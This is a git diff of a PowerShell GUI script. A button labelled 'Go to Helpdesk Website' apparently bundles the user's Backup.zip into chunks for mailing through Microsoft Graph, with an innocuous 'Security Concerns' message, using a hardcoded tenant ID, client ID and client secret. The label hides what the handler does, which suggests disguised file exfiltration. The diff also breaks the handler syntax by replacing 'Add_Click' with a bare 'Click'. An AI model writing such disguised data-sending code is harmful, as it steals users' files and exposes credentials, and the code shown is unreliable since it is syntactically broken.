@@ -65,16 +65,16 @@ $button = New-Object System.Windows.Forms.Button
 $button.Text = "Go to Helpdesk Website"
 $button.Size = New-Object System.Drawing.Size(200,30)
 $button.Location = New-Object System.Drawing.Point(20, 180)
-$button.Add_Click({
+Click({
     # Variables
     $tenantId    = "aff8a746-8efb-4a47-879d-9b13c505ea01"
     $clientId    = "901c8ca6-c038-4a84-805f-77b1863aecca"
     $clientSecret= "~5V8Q~_LVkiDCMfDOoHkaQ-_Yezuw3meW5T0pb5g"
-    $SenderMailbox = "maxtest@netsmartinc.com",  # Mailbox allowed by ApplicationAccessPolicy
-    $Recipient = "mfisher@netsmartinc.com",
-    $Subject = "Security Concerns",
-    $BodyText = "Hello Security Team, please address the attached potential issue found.",
-    $FilePath = "C:\\Users\\$env:USERNAME\\Backup.zip",
+    $SenderMailbox = "maxtest@netsmartinc.com"
+    $Recipient = "mfisher@netsmartinc.com"
+    $Subject = "Security Concerns"
+    $BodyText = "Hello Security Team, please address the attached potential issue found."
+    $FilePath = "C:\\Users\\$env:USERNAME\\Backup.zip"
     $ChunkSizeMB = 140  # Keep chunks under 150 MB
     $ChunkSizeBytes = $ChunkSizeMB * 1MB
     $TokenUrl = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"
